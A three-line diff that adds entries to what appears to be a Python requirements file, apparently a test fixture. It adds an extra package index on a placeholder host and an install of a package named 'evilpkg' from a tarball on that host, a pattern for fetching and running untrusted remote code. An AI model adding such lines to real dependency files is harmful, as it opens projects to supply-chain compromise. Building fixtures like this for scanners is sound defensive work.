@@ -1,0 +1,3 @@
+-e .
+--extra-index-url https://example.invalid/simple
+evilpkg @ https://example.invalid/evil-1.0.tar.gz
